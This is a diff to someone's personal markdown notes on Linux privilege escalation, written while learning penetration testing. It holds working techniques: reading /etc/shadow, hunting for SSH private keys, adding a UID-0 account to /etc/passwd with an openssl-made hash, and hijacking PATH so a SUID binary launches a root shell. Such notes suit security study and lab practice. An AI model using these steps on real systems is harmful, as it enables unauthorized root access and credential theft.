@@ -218,13 +218,25 @@ Random notes I've made while learning about hacking that might prove useful in t
 - `sudo -V` (< 1.8.28 are vulnerable to CVE-2019-14287)'
 - check what we can sudo: `sudo -l`
 - check files in /etc for passwords and other information (/etc/passwd, /etc/shadow, /etc/hosts)
-- edit /etc/passwd to get root: https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+- `cat /etc/crontab`
 
 - `whoami` and `id`
 - show distrubution version:`lsb_release -a`
 - show current shell: `echo $0`
 - find SSH keys: `find / -name id_rsa 2> /dev/null`
 - show host MOTD: `cat /etc/update-motd.d/00-header`
+
+### Edit /etc/passwd to get root
+- generate password hash for new user: `openssl passwd -1 -salt [salt] [password]`
+- add the following: `[username]:[hash]:0:0:root:/root:/bin/bash`
+
+### Malicious binary for SUID binary with PATH variable
+- example: script runs 'ls' as root
+- `cd /tmp`
+- `echo "/bin/bash" > ls`
+- `chmod +x ls`
+- export PATH=/tmp:$PATH
+- run the SUID binary
 
 ### Find command
 - look for all files with `.log` extension: `find type -f -name "*.log 2>/dev/null"`
